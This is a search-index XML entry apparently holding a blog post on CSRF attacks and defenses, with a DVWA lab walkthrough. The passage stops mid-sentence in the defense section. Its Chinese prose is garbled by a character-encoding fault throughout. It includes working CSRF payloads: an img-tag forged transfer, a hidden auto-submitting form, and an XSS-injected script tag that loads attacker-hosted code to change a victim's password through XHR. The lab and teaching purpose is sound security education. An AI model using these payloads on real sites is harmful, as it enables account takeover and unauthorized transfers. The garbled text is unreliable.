<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[CSRFçš„æ”»å‡»ä¸Žé˜²å¾¡åŽŸç†]]></title>
    <url>%2Fposts%2F21bbd6b8.html%2F</url>
    <content type="text"><![CDATA[é•¿é£Žç ´æµªä¼šæœ‰æ—¶ï¼Œç›´æŒ‚äº‘å¸†æµŽæ²§æµ· CSRFï¼ˆCross Site Request Forgeryï¼‰è·¨ç«™åŸŸè¯·æ±‚ä¼ªé€ ï¼Œæ˜¯ä¸€ç§ç½‘ç»œçš„æ”»å‡»æ–¹å¼ï¼Œå®ƒåœ¨2007å¹´æ›¾è¢«åˆ—ä¸ºäº’è”ç½‘20å¤§å®‰å…¨éšæ‚£ä¹‹ä¸€,ä¹Ÿè¢«ç§°ä¸ºâ€œOne Click Attackâ€æˆ–è€…Session Ridingï¼Œé€šå¸¸ç¼©å†™ä¸ºCSRFæˆ–è€…XSRFï¼Œæ˜¯ä¸€ç§å¯¹ç½‘ç«™çš„æ¶æ„åˆ©ç”¨ï¼Œä¹Ÿå°±æ˜¯äººä»¬æ‰€çŸ¥é“çš„é’“é±¼ç½‘ç«™ã€‚CSRFä»‹ç» CSRFæ”»å‡»å¯ä»¥åœ¨å—å®³è€…æ¯«ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ä»¥å—å®³è€…åä¹‰ä¼ªé€ è¯·æ±‚å‘é€ç»™å—æ”»å‡»ç«™ç‚¹ï¼Œä»Žè€Œåœ¨å¹¶æœªæŽˆæƒçš„æƒ…å†µä¸‹æ‰§è¡Œåœ¨æƒé™ä¿æŠ¤ä¹‹ä¸‹çš„æ“ä½œï¼Œæœ‰å¾ˆå¤§çš„å±å®³æ€§ã€‚ å°½ç®¡å¬èµ·æ¥è·ŸXSSè·¨ç«™è„šæœ¬æ”»å‡»æœ‰ç‚¹ç›¸ä¼¼ï¼Œä½†äº‹å®žä¸ŠCSRFä¸ŽXSSå·®åˆ«å¾ˆå¤§ï¼ŒXSSåˆ©ç”¨çš„æ˜¯ç«™ç‚¹å†…çš„ä¿¡ä»»ç”¨æˆ·ï¼Œè€ŒCSRFåˆ™æ˜¯é€šè¿‡ä¼ªè£…æ¥è‡ªå—ä¿¡ä»»ç”¨æˆ·çš„è¯·æ±‚æ¥åˆ©ç”¨å—ä¿¡ä»»çš„ç½‘ç«™ã€‚ ä¸ŽXSSæ”»å‡»ç›¸æ¯”ï¼ŒCSRFæ”»å‡»å¾€å¾€ä¸å¤§æµè¡Œï¼Œå› æ­¤å¯¹å…¶è¿›è¡Œé˜²èŒƒçš„èµ„æºä¹Ÿç›¸å½“ç¨€å°‘å’Œéš¾ä»¥é˜²èŒƒï¼Œæ‰€ä»¥CSRFè¢«è®¤ä¸ºæ¯”XSSæ›´å…·å±é™©æ€§ã€‚ ä¸Šå›¾ä¸ºCSRFæ”»å‡»çš„ä¸€ä¸ªç®€å•æ¨¡åž‹ï¼Œç”¨æˆ·è®¿é—®æ¶æ„ç½‘ç«™Bï¼Œæ¶æ„ç½‘ç«™Bè¿”å›žç»™ç”¨æˆ·çš„HTTPä¿¡æ¯ä¸­è¦æ±‚ç”¨æˆ·è®¿é—®ç½‘ç«™Aï¼Œè€Œç”±äºŽç”¨æˆ·å’Œç½‘ç«™Aä¹‹é—´å¯èƒ½å·²ç»æœ‰ä¿¡ä»»å…³ç³»å¯¼è‡´è¿™ä¸ªè¯·æ±‚å°±åƒç”¨æˆ·çœŸå®žå‘é€çš„ä¸€æ ·ä¼šè¢«æ‰§è¡Œã€‚CSRFçš„æ”»å‡»åŽŸç†1ã€ç”¨æˆ·Cæ‰“å¼€æµè§ˆå™¨ï¼Œè®¿é—®å—ä¿¡ä»»ç½‘ç«™Aï¼Œè¾“å…¥ç”¨æˆ·åå’Œå¯†ç è¯·æ±‚ç™»å½•ç½‘ç«™Aï¼›2ã€åœ¨ç”¨æˆ·ä¿¡æ¯é€šè¿‡éªŒè¯åŽï¼Œç½‘ç«™Aäº§ç”ŸCookieä¿¡æ¯å¹¶è¿”å›žç»™æµè§ˆå™¨ï¼Œæ­¤æ—¶ç”¨æˆ·ç™»å½•ç½‘ç«™AæˆåŠŸï¼Œå¯ä»¥æ­£å¸¸å‘é€è¯·æ±‚åˆ°ç½‘ç«™Aï¼›3ã€ç”¨æˆ·åœ¨æœªé€€å‡ºç½‘ç«™Açš„æƒ…å†µä¸‹ï¼ˆcookieæœ‰æ•ˆçš„æƒ…å†µï¼‰ï¼Œåœ¨åŒä¸€æµè§ˆå™¨ä¸­ï¼Œæ‰“å¼€äº†å¦ä¸€ä¸ªç½‘ç«™Bï¼›4ã€ç½‘ç«™BæŽ¥æ”¶åˆ°ç”¨æˆ·è¯·æ±‚åŽï¼Œè¿”å›žä¸€äº›æ”»å‡»æ€§ä»£ç ï¼Œå¹¶å‘å‡ºä¸€ä¸ªè¯·æ±‚è¦æ±‚è®¿é—®ç«™ç‚¹Aï¼Œè¿™ä¸ªè¯·æ±‚ä¼šå¸¦ä¸Šæµè§ˆå™¨ç«¯æ‰€ä¿å­˜çš„æœ‰æ•ˆçš„ç«™ç‚¹Açš„cookieï¼›5.ã€æµè§ˆå™¨åœ¨æŽ¥æ”¶åˆ°è¿™äº›æ”»å‡»æ€§ä»£ç åŽï¼Œæ ¹æ®ç½‘ç«™Bçš„è¯·æ±‚ï¼Œåœ¨ç”¨æˆ·ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹æºå¸¦Cookieä¿¡æ¯ï¼Œå‘ç½‘ç«™Aå‘å‡ºè¯·æ±‚ã€‚ç½‘ç«™Aå¹¶ä¸çŸ¥é“è¯¥è¯·æ±‚å…¶å®žæ˜¯ç”±Bå‘èµ·çš„ï¼Œæ‰€ä»¥ä¼šæ ¹æ®ç”¨æˆ·Cçš„Cookieä¿¡æ¯ä»¥Cçš„æƒé™å¤„ç†è¯¥è¯·æ±‚ï¼Œå¯¼è‡´æ¥è‡ªç½‘ç«™Bçš„æ¶æ„ä»£ç è¢«æ‰§è¡Œã€‚ å› æ­¤ï¼Œç«™ç‚¹Aä¼šæŠ¥æ®ç”¨æˆ·Cçš„æƒé™æ¥å¤„ç†æ¶æ„ç«™ç‚¹Bæ‰€å‘èµ·çš„è¯·æ±‚ï¼Œè€Œè¿™ä¸ªè¯·æ±‚å¯èƒ½ä»¥ç”¨æˆ·Cçš„èº«ä»½å‘é€é‚®ä»¶ã€çŸ­ä¿¡ã€æ¶ˆæ¯ï¼Œä»¥åŠè¿›è¡Œè½¬è´¦æ”¯ä»˜ç­‰æ“ä½œï¼Œè¿™æ ·æ¶æ„ç«™ç‚¹Bå°±è¾¾åˆ°äº†ä¼ªé€ ç”¨æˆ·Cè¯·æ±‚ç«™ç‚¹ Açš„ç›®çš„ã€‚ å—å®³è€…åªéœ€è¦åšä¸‹é¢ä¸¤ä»¶äº‹æƒ…ï¼Œæ”»å‡»è€…å°±èƒ½å¤Ÿå®ŒæˆCSRFæ”»å‡»ï¼šç™»å½•å—ä¿¡ä»»ç«™ç‚¹ Aï¼Œå¹¶åœ¨æœ¬åœ°ç”Ÿæˆcookieï¼›åœ¨ä¸ç™»å‡ºç«™ç‚¹Aï¼ˆç«™ç‚¹Açš„cookieæœ‰æ•ˆï¼‰çš„æƒ…å†µä¸‹ï¼Œè®¿é—®æ¶æ„ç«™ç‚¹Bã€‚ çœ‹åˆ°è¿™é‡Œï¼Œä½ ä¹Ÿè®¸ä¼šè¯´ï¼šâ€œå¦‚æžœæˆ‘ä¸æ»¡è¶³ä»¥ä¸Šä¸¤ä¸ªæ¡ä»¶ä¸­çš„ä¸€ä¸ªï¼Œæˆ‘å°±ä¸ä¼šå—åˆ°CSRFçš„æ”»å‡»ã€‚â€æ˜¯çš„ï¼Œç¡®å®žå¦‚æ­¤ï¼Œä½†ä½ ä¸èƒ½ä¿è¯ä»¥ä¸‹æƒ…å†µä¸ä¼šå‘ç”Ÿï¼š1ã€ä½ ä¸èƒ½ä¿è¯ä½ ç™»å½•äº†ä¸€ä¸ªç½‘ç«™åŽï¼Œä¸å†æ‰“å¼€ä¸€ä¸ªtabé¡µé¢å¹¶è®¿é—®å¦å¤–çš„ç½‘ç«™ã€‚2ã€ä½ ä¸èƒ½ä¿è¯ä½ å…³é—­æµè§ˆå™¨äº†åŽï¼Œä½ æœ¬åœ°çš„Cookieç«‹åˆ»è¿‡æœŸï¼Œä½ ä¸Šæ¬¡çš„ä¼šè¯å·²ç»ç»“æŸã€‚äº‹å®žä¸Šï¼Œå…³é—­æµè§ˆå™¨ä¸èƒ½ç»“æŸä¸€ä¸ªä¼šè¯ï¼Œä½†å¤§å¤šæ•°äººéƒ½ä¼šé”™è¯¯çš„è®¤ä¸ºå…³é—­æµè§ˆå™¨å°±ç­‰äºŽé€€å‡ºç™»å½•/ç»“æŸä¼šè¯äº†ã€‚3ã€ä¸Šå›¾ä¸­æ‰€è°“çš„æ”»å‡»ç½‘ç«™ï¼Œå¾ˆå¤šæƒ…å†µä¸‹å¯èƒ½æ˜¯ä¸€ä¸ªå­˜åœ¨å…¶ä»–æ¼æ´žï¼ˆå¦‚XSSï¼‰çš„å¯ä¿¡ä»»ä¸”ç»å¸¸è¢«äººè®¿é—®çš„ç½‘ç«™ã€‚CSRFçš„æ”»å‡»ä¸¾ä¾‹ å‡è®¾æŸé“¶è¡Œç½‘ç«™Aä»¥GETè¯·æ±‚æ¥å‘èµ·è½¬è´¦æ“ä½œï¼Œè½¬è´¦çš„åœ°å€ä¸ºwww.xxx.com/transfer.doï¼ŸaccountNum=l000l&amp;money=10000ï¼Œå‚æ•°accountNumè¡¨ç¤ºè½¬è´¦çš„è´¦æˆ·ï¼Œå‚æ•°moneyè¡¨ç¤ºè½¬è´¦é‡‘é¢ã€‚è€ŒæŸå¤§åž‹è®ºå›Bä¸Šï¼Œä¸€ä¸ªæ¶æ„ç”¨æˆ·ä¸Šä¼ äº†ä¸€å¼ å›¾ç‰‡ï¼Œè€Œå›¾ç‰‡çš„åœ°å€æ ä¸­å¡«çš„å¹¶ä¸æ˜¯å›¾ç‰‡çš„åœ°å€ï¼Œè€Œæ˜¯å‰è€Œæ‰€è¯´çš„ç –è´¦åœ°å€ï¼š&lt;img src=&quot;http://www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000&quot;&gt; å½“ä½ ç™»å½•ç½‘ç«™AåŽï¼Œæ²¡æœ‰åŠæ—¶ç™»å‡ºï¼Œè¿™æ—¶ä½ è®¿é—®äº†è®ºå›Bï¼Œä¸å¹¸çš„äº‹æƒ…å‘ç”Ÿäº†ï¼Œä½ ä¼šå‘çŽ°ä½ çš„è´¦å·é‡Œé¢å°‘äº†10000å—ã€‚ ä¸ºä»€ä¹ˆä¼šè¿™æ ·å‘¢ï¼Œåœ¨ä½ ç™»å½•é“¶è¡ŒAæ—¶ï¼Œä½ çš„æµè§ˆå™¨ç«¯ä¼šç”Ÿæˆé“¶è¡ŒAçš„cookieï¼Œè€Œå½“ä½ è®¿é—®è®ºå›Bçš„æ—¶å€™ï¼Œé¡µé¢ä¸Šçš„&lt;img&gt;æ ‡ç­¾éœ€è¦æµè§ˆå™¨å‘èµ·ä¸€ä¸ªæ–°çš„HTTPè¯·æ±‚ï¼Œä»¥èŽ·å¾—å›¾ç‰‡èµ„æºï¼Œå½“æµè§ˆå™¨å‘èµ·è¯·æ±‚æ—¶ï¼Œè¯·æ±‚çš„å´æ˜¯é“¶è¡ŒAçš„è½¬è´¦åœ°å€www.xxx.com/transfer.do?accountNum=l000l&amp;money=10000ï¼Œå¹¶ä¸”ä¼šå¸¦ä¸Šé“¶è¡ŒAçš„cookieä¿¡æ¯ï¼Œç»“æžœé“¶è¡Œçš„æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªè¯·æ±‚åŽï¼Œä¼šä»¥ä¸ºæ˜¯ä½ å‘èµ·çš„ä¸€æ¬¡è½¬è´¦æ“ä½œï¼Œå› æ­¤ä½ çš„è´¦å·é‡Œè¾¹ä¾¿å°‘äº†10000å—ã€‚ å½“ç„¶ï¼Œç»å¤§å¤šæ•°ç½‘ç«™éƒ½ä¸ä¼šä½¿ç”¨GETè¯·æ±‚æ¥è¿›è¡Œæ•°æ®æ›´æ–°ï¼Œå› æ­¤ï¼Œæ”»å‡»è€…ä¹Ÿéœ€è¦æ”¹å˜æ€è·¯ï¼Œä¸Žæ—¶ä¿±è¿›ã€‚ å‡è®¾é“¶è¡Œå°†å…¶è½¬è´¦æ–¹å¼æ”¹æˆPOSTæäº¤ï¼Œè€Œè®ºå›Bæ°å¥½åˆå­˜åœ¨ä¸€ä¸ªXSSæ¼æ´žï¼Œæ¶æ„ç”¨æˆ·åœ¨å®ƒçš„é¡µé¢ä¸Šæ¤å…¥å¦‚ä¸‹ä»£ç ï¼š12345678&lt;form id="aaa" action="http://www.xxx.com/transfer.do" metdod="POST" display="none"&gt; &lt;input type="text" name="accountNum" value="10001"/&gt; &lt;input type="text" name="money" value="10000"/&gt;&lt;/form&gt;&lt;script&gt; var form = document.forms('aaa'); form.submit();&lt;/script&gt; å¦‚æžœä½ æ­¤æ—¶æ°å¥½ç™»å½•äº†é“¶è¡ŒAï¼Œä¸”æ²¡æœ‰ç™»å‡ºï¼Œå½“ä½ æ‰“å¼€ä¸Šè¿°é¡µé¢åŽï¼Œè„šæœ¬ä¼šå°†è¡¨å•aaaæäº¤ï¼ŒæŠŠaccountNumå’Œmoneyå‚æ•°ä¼ é€’ç»™é“¶è¡Œçš„è½¬è´¦åœ°å€http://www.xxx.com/transfer.doï¼ŒåŒæ ·çš„ï¼Œé“¶è¡Œä»¥ä¸ºæ˜¯ä½ å‘èµ·çš„ä¸€æ¬¡è½¬è´¦ä¼šä»Žä½ çš„è´¦æˆ·ä¸­æ‰£é™¤10000å—ã€‚ å½“ç„¶ï¼Œä»¥ä¸Šåªæ˜¯ä¸¾ä¾‹ï¼Œæ­£å¸¸æ¥è¯´é“¶è¡Œçš„äº¤æ˜“ä»˜æ¬¾ä¼šæœ‰USB keyã€éªŒè¯ç ã€ç™»å½•å¯†ç å’Œæ”¯ä»˜å¯†ç ç­‰ä¸€ç³»åˆ—å±éšœï¼Œæµç¨‹æ¯”ä¸Šè¿°æµç¨‹å¤æ‚å¾—å¤šï¼Œå› æ­¤å®‰å…¨ç³»æ•°ä¹Ÿé«˜å¾—å¤šã€‚DVWAä¸‹çš„CSRFæ”»å‡»å®žéªŒCSRFæ¼æ´žðŸ”ºGetæ–¹å¼åˆ©ç”¨æ¼æ´žç¡®è®¤ï¼š1ã€ä¿®æ”¹å¯†ç ï¼Œæ²¡æœ‰å¯¹åŽŸå¯†ç è¿›è¡ŒéªŒè¯ï¼Œç›´æŽ¥ä¿®æ”¹äº†ï¼Œ åˆ¤æ–­ç¼ºå°‘éªŒè¯æœºåˆ¶ï¼Œå¯èƒ½å­˜åœ¨CSRF2ã€ç¡®è®¤refereræ— é™åˆ¶ï¼Œæ— token1http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=password&amp;password_conf=password&amp;Change=Change#æ¼æ´žåˆ©ç”¨ï¼š1ã€ç›´æŽ¥å‘é€é“¾æŽ¥2ã€è¯±éª—ç”¨æˆ·ç‚¹å‡»3ã€ä¼šå¼¹å‡ºæç¤ºç¼ºç‚¹ï¼šè¯¥åˆ©ç”¨æ–¹æ³•ï¼Œå®¹æ˜“è¢«ç”¨æˆ·å‘çŽ°ã€‚æ”¹è¿›æ€è·¯ï¼š ç»“åˆXSSï¼Œå½¢æˆXSRFã€‚ç”¨æˆ·è§¦å‘XSSæ¼æ´žï¼ˆå­˜å‚¨åž‹æœ€ä½³ï¼‰ï¼Œç„¶åŽXSSæ¼æ´žæ‰§è¡Œscript&lt;script src=&quot;ä¿®æ”¹å¯†ç çš„é“¾æŽ¥&quot;&gt;&lt;/script&gt;ã€‚å‰ææ˜¯éœ€è¦åœ¨ç”¨æˆ·è®¿é—®æ¦‚çŽ‡é«˜çš„ç½‘ç«™ä¸ŠæŒ–åˆ°XSSæ¼æ´žï¼Œæˆ–è€…æ¬ºéª—ç”¨æˆ·è®¿é—®é’“é±¼ç«™ç‚¹ã€‚æ”¹è¿›æµç¨‹ï¼šï¼‘ã€ä¿æŒdvwaä¸­csrfé¡µé¢çš„ç™»å½•ï¼ˆå°¾æ•°129ï¼‰ï¼’ã€éƒ¨ç½²ä¸€ä¸ªcsrfç«™ç‚¹ï¼ˆå°¾æ•°130ï¼‰ï¼Œåˆ©ç”¨XSS(Stored);ï¼“ã€åœ¨130å¢žåŠ ä¸€ä¸ªXSSåŸ‹ä¼1&lt;script src="http://192.168.123.129/dvwa/vulnerabilities/csrf/?password_new=123&amp;password_conf=123&amp;Change=Change#"&gt;&lt;/script&gt;ï¼”ã€é‡æ–°ç”¨æ­¥éª¤3çš„å¯†ç 123ç™»å½•ï¼Œè§‚å¯Ÿæ•ˆæžœã€‚CSRFæ¼æ´žðŸ”ºPostæ–¹å¼åˆ©ç”¨ä½¿ç”¨CSRFTesteræ€è·¯çŽ¯å¢ƒå‡†å¤‡ï¼šä¿®æ”¹DVWAä¸‹CSRFæ¼æ´žçš„æºç ä¸ºPOSTæ–¹å¼æäº¤æ‰¾åˆ°/csrfçš„index.phpï¼Œå°†getæäº¤æ–¹å¼ä¿®æ”¹ä¸ºpostæ‰¾åˆ°/csrfçš„low.phpï¼Œå°†$ï¼¿GETä¿®æ”¹ä¸º$ï¼¿REQUEST(è¯´æ˜Ž:è¿™ä¸ªè¡¨ç¤ºå¯ä»¥ç”¨getä¹Ÿå¯ä»¥ç”¨POST)æµ‹è¯•æ˜¯å¦æˆåŠŸä¿®æ”¹POSTæäº¤æ–¹å¼POSTæ–¹å¼æäº¤ï¼Œæäº¤åŽURLä¸ä¼šå‡ºçŽ°å…·ä½“çš„å‚æ•°åŠå‚æ•°å€¼æŠ“å–POSTæäº¤æ–¹å¼çš„æ•°æ®åŒ…é€šè¿‡OWASP CSRFTesteræŠ“åŒ…OWASP CSRFTesteræž„å»ºè¡¨å•Formsï¼Œåˆ›å»ºä¸€ä¸ªformè¡¨å•ã€‚å†…å®¹ä¸ºhiddenï¼Œç”¨æˆ·ä¸å¯è§ï¼ˆå¯getã€postï¼‰iFrameï¼šåˆ›å»ºä¸€ä¸ªiframeæ¡†æž¶ï¼Œé«˜å®½ä¸º0ï¼Œç”¨æˆ·ä¸å¯è§ï¼ˆå¯getã€post ï¼‰IMGï¼šåˆ›å»ºä¸€ä¸ªIMGæ ‡ç­¾ï¼ˆåªèƒ½getï¼‰XHRï¼šåˆ›å»ºä¸€ä¸ªAJAXè¯·æ±‚ï¼ˆå¯getã€post ï¼‰Linkï¼šåˆ›å»ºä¸€ä¸ªaæ ‡ç­¾çš„è¶…é“¾æŽ¥ï¼ˆåªèƒ½getï¼‰ä¿®æ”¹ä¸Šä¸€æ­¥ç”Ÿäº§çš„index.htmlå°†æ–‡æ¡£æ”¾ç½®åœ¨csrfç«™ç‚¹ï¼Œhttp://192.168.123.130/csrf/index.htmlæµ‹è¯•1ã€ä¿æŒdvwaåœ¨csrfçš„æ¨¡å—2ã€åœ¨åŒä¸€ä¸ªæµè§ˆå™¨è¾“å…¥urlï¼Œhttp://192.168.123.130/csrf/index.htmlï¼Œç„¶åŽé€€å‡ºdvwaé¡µé¢ç™»å½•ï¼Œæµ‹è¯•å¯†ç æ˜¯å¦ä¸º444ï¼Œä½†æ˜¯æ²¡æœ‰åŠžæ³•é™é»˜æ‰§è¡Œï¼Œå› ä¸ºä¼šæœ‰æç¤ºä½¿ç”¨Ajaxæ€è·¯é€šè¿‡Ajaxï¼Œxmlrequestå¾€è¡¨å•é‡Œé¢æäº¤æ•°æ®çŽ¯å¢ƒå‡†å¤‡ï¼š1ã€åœ¨dvwaä¸Šï¼ŒåŒæ—¶å­˜åœ¨csrfå’Œxss2ã€åœ¨csrfç«™ç‚¹ä¸Šï¼Œåˆ¶é€ ajax.html123456&lt;script&gt;xmlhttp=new XMLHttpRequest();xmlhttp.open(â€œPOSTâ€,http://192.168.123.129/dvwa/vulnerabilities/csrf/â€,true);xmlhttp.setRequestHeader(â€œContent-typeâ€,â€application/x-www-form-urlencodedâ€);xmlhttp.send(â€œpassword_new=123456&amp;password_conf=123456â€&amp;Change=Changeâ€);&lt;/script&gt;http://192.168.123.130/csrf/ajax.html3ã€åœ¨dvwaä¸‹ï¼Œåˆ©ç”¨åå°„åž‹XSSæ›´æ”¹å¯†ç 1&lt;script src="http://192.168.123.130/csrf/ajax.html"&gt;&lt;/script&gt;æ­¤æ—¶å¯†ç å·²ç»ä¿®æ”¹4ã€ç”¨adminå’Œpasswordç™»å½•æˆåŠŸ å¦‚æžœåœ¨ç›®æ ‡ç«™ç‚¹æœ¬èº«ä¸Šå­˜åœ¨XSSï¼Œåˆ™å¯ä»¥è¿™æ ·åˆ©ç”¨ï¼Œä½¿ç”¨&lt;script&gt;ï¼Œ&lt;img&gt;æ ‡ç­¾ã€‚ä½†ç›®æ ‡ç«™ç‚¹å¦‚æžœå­˜åœ¨XSSï¼Œåˆ™ç›´æŽ¥åˆ©ç”¨XSSæ¯”åˆ©ç”¨CSRFæ›´ä¾¿æ·ã€‚å°ç»“ GETæ–¹å¼ï¼Œåœ¨ç”¨æˆ·æ´»åŠ¨çŠ¶æ€ä¸‹ç‚¹å‡»å³å¯å®Œæˆæ“ä½œ POSTæ–¹å¼ï¼Œå‚æ•°ä¸èƒ½é€šè¿‡URLæäº¤ï¼Œéœ€è¦æž„å»ºè¡¨å•ï¼Œæ¬ºéª—ç”¨æˆ·è®¿é—®ã€‚è¯¥æƒ…å†µä»ç„¶ç»“åˆXSSçš„æ¯”è¾ƒå¤šï¼Œæˆ–è€…ç›´æŽ¥è¯±éª—ç”¨æˆ·è®¿é—®æ”»å‡»è€…è‡ªå·±æ­å»ºçš„é’“é±¼ç«™ç‚¹ã€‚CSRFæ¼æ´žæ£€æµ‹ðŸ˜„ å¦‚ä½•ç¡®è®¤ä¸€ä¸ªwebç³»ç»Ÿå­˜åœ¨CSRFæ¼æ´žå‘¢ï¼Œæœ€ç®€å•çš„æ–¹æ³•å°±æ˜¯æŠ“å–ä¸€ä¸ªæ­£å¸¸è¯·æ±‚çš„æ•°æ®åŒ…ï¼ŒåŽ»æŽ‰Refererå­—æ®µåŽå†é‡æ–°æäº¤ï¼Œå¦‚æžœè¯¥æäº¤è¿˜æœ‰æ•ˆï¼Œé‚£ä¹ˆåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šå­˜åœ¨CSRFæ¼æ´žã€‚ðŸ‘‰æ­¥éª¤1 å¯¹ç›®æ ‡ç«™ç‚¹è¿›è¡Œè¸©ç‚¹ï¼Œå¯¹å¢žåˆ æ”¹çš„åœ°æ–¹è¿›è¡Œæ ‡è®°ï¼Œå¹¶è§‚å¯Ÿå…¶é€»è¾‘æ¯”å¦‚ä¿®æ”¹ç®¡ç†å‘˜è´¦æˆ·æ—¶ï¼Œä¸éœ€è¦æä¾›éªŒè¯æ—§å¯†ç æ¯”å¦‚æäº¤ç•™è¨€çš„åŠ¨ä½œï¼Œå…³æ³¨XXå¾®åšçš„åŠ¨ä½œç­‰ç­‰ðŸ‘‰æ­¥éª¤2 æäº¤æ“ä½œï¼ˆget/postï¼‰ï¼Œè§‚å¯Ÿhttpå¤´éƒ¨ çš„refererï¼Œå¹¶éªŒè¯åŽå°æ˜¯å¦æœ‰refereré™åˆ¶æ¯”å¦‚ä½¿ç”¨æŠ“åŒ…å·¥å…·æŠ“åŒ…ï¼Œç„¶åŽä¿®æ”¹/åˆ é™¤refereråŽï¼Œé‡æ”¾ï¼Œ çœ‹æ˜¯å¦å¯ä»¥æ­£å¸¸æäº¤ã€‚ðŸ‘‰æ­¥éª¤3 ç¡®è®¤cookieçš„æœ‰æ•ˆæ€§ï¼ˆæ¬ºéª—ï¼Œæˆ–ç›®æ ‡ç½‘ ç«™å­˜åœ¨æ¼æ´žï¼‰è™½ç„¶é€€å‡ºæˆ–å…³é—­äº†æµè§ˆå™¨ï¼Œä½†sessionå¹¶æ²¡æœ‰è¿‡æœŸã€‚ éšç€å¯¹CSRFæ¼æ´žç ”ç©¶çš„ä¸æ–­æ·±å…¥ï¼Œä¸æ–­æ¶ŒçŽ°å‡ºä¸€äº›ä¸“é—¨é’ˆå¯¹CSRFæ¼æ´žè¿›è¡Œæ£€æµ‹çš„å·¥å…·ï¼Œå¦‚CSRFTesterï¼ŒCSRF Request Builderã€‚ä»¥CSRFTesterå·¥å…·ä¸ºä¾‹ï¼ŒCSRFæ¼æ´žæ£€æµ‹å·¥å…·çš„æµ‹è¯•åŽŸç†å¦‚ä¸‹ï¼š ä½¿ç”¨CSRFTesterè¿›è¡Œæµ‹è¯•æ—¶ï¼Œé¦–å…ˆéœ€è¦æŠ“å–æˆ‘ä»¬åœ¨æµè§ˆå™¨ä¸­è®¿é—®è¿‡çš„æ‰€æœ‰é“¾æŽ¥ä»¥åŠæ‰€æœ‰çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œç„¶åŽé€šè¿‡åœ¨CSRFTesterä¸­ä¿®æ”¹ç›¸åº”çš„è¡¨å•ç­‰ä¿¡æ¯ï¼Œé‡æ–°æäº¤ï¼Œè¿™ç›¸å½“äºŽä¸€æ¬¡ä¼ªé€ å®¢æˆ·ç«¯è¯·æ±‚ã€‚å¦‚æžœä¿®æ”¹åŽçš„æµ‹è¯•è¯·æ±‚æˆåŠŸè¢«ç½‘ç«™æœåŠ¡å™¨æŽ¥å—ï¼Œåˆ™è¯´æ˜Žå­˜åœ¨CSRFæ¼æ´žï¼Œå½“ç„¶æ­¤æ¬¾å·¥å…·ä¹Ÿå¯ä»¥è¢«ç”¨æ¥è¿›è¡ŒCSRFæ”»å‡»ã€‚CSRFæ”»å‡»çš„é˜²å¾¡ðŸ‘ ç›®å‰é˜²å¾¡CSRFæ”»å‡»ä¸»è¦æœ‰ä¸‰ç§ç­–ç•¥ï¼šéªŒè¯HTTP Refererå­—æ®µï¼›åœ¨è¯·æ±‚åœ°å€ä¸­æ·»åŠ tokenå¹¶éªŒè¯ï¼›åœ¨HTTPå¤´ä¸­è‡ªå®šä¹‰å±žæ€§å¹¶éªŒè¯ã€‚éªŒè¯HTTP Refererå­—æ®µ æ ¹æ®HTTPåè®®ï¼Œåœ¨HTTPå¤´ä¸­æœ‰ä¸€ä¸ªå­—æ®µå«Refererï¼Œå®ƒè®°å½•äº†è¯¥HTTPè¯·æ±‚çš„æ¥æºåœ°å€ã€‚åœ¨é€šå¸¸æƒ…å†µä¸‹ï¼Œè®¿é—®ä¸€ä¸ªå®‰å…¨å—é™é¡µé¢çš„è¯·æ±‚æ¥è‡ªäºŽåŒä¸€ä¸ªç½‘ç«™ï¼Œæ¯”å¦‚éœ€è¦è®¿é—®http://bank.example/withdraw?account=bob&amp;amount=1000000&amp;for=Malloryï¼Œç”¨æˆ·å¿…é¡»å…ˆç™»é™†bank.exampleï¼Œç„¶åŽé€šè¿‡ç‚¹å‡»é¡µé¢ä¸Šçš„æŒ‰é’®æ¥è§¦å‘è½¬è´¦äº‹ä»¶ã€‚è¿™æ—¶ï¼Œè¯¥è½¬å¸è¯·æ±‚çš„ Referer å€¼å°±ä¼šæ˜¯è½¬è´¦æŒ‰é’®æ‰€åœ¨çš„é¡µé¢çš„URLï¼Œé€šå¸¸æ˜¯ä»¥bank.exampleåŸŸåå¼€å¤´çš„åœ°å€ã€‚è€Œå¦‚æžœé»‘å®¢è¦å¯¹é“¶è¡Œç½‘ç«™å®žæ–½CSRFæ”»å‡»ï¼Œä»–åªèƒ½åœ¨ä»–è‡ªå·±çš„ç½‘ç«™æž„é€ è¯·æ±‚ï¼Œå½“ç”¨æˆ·é€šè¿‡é»‘å®¢çš„ç½‘ç«™å‘é€è¯·æ±‚åˆ°é“¶è¡Œæ—¶ï¼Œè¯¥è¯·æ±‚çš„Refereræ˜¯æŒ‡å‘é»‘å®¢è‡ªå·±çš„ç½‘ç«™ã€‚å› æ­¤ï¼Œè¦é˜²å¾¡CSRFæ”»å‡»ï¼Œé“¶è¡Œç½‘ç«™åªéœ€è¦å¯¹äºŽæ¯ä¸€ä¸ªè½¬è´¦è¯·æ±‚éªŒè¯å…¶Refererå€¼ï¼Œå¦‚æžœæ˜¯ä»¥bank.exampleå¼€å¤´çš„åŸŸåï¼Œåˆ™è¯´æ˜Žè¯¥è¯·æ±‚æ˜¯æ¥è‡ªé“¶è¡Œç½‘ç«™è‡ªå·±çš„è¯·æ±‚ï¼Œæ˜¯åˆæ³•çš„ã€‚å¦‚æžœRefereræ˜¯å…¶ä»–ç½‘ç«™çš„è¯ï¼Œåˆ™æœ‰å¯èƒ½æ˜¯é»‘å®¢çš„CSRFæ”»å‡»ï¼Œæ‹’ç»è¯¥è¯·æ±‚ã€‚ è¿™ç§æ–¹æ³•çš„æ˜¾è€Œæ˜“è§çš„å¥½å¤„å°±æ˜¯ç®€å•æ˜“è¡Œï¼Œç½‘ç«™çš„æ™®é€šå¼€å‘äººå‘˜ä¸éœ€è¦æ“å¿ƒCSRFçš„æ¼æ´žï¼Œåªéœ€è¦åœ¨æœ€åŽç»™æ‰€æœ‰å®‰å…¨æ•æ„Ÿçš„è¯·æ±‚ç»Ÿä¸€å¢žåŠ ä¸€ä¸ªæ‹¦æˆªå™¨æ¥æ£€æŸ¥Refererçš„å€¼å°±å¯ä»¥ã€‚ç‰¹åˆ«æ˜¯å¯¹äºŽå½“å‰çŽ°æœ‰çš„ç³»ç»Ÿï¼Œä¸éœ€è¦æ”¹å˜å½“å‰ç³»ç»Ÿçš„ä»»ä½•å·²æœ‰ä»£ç 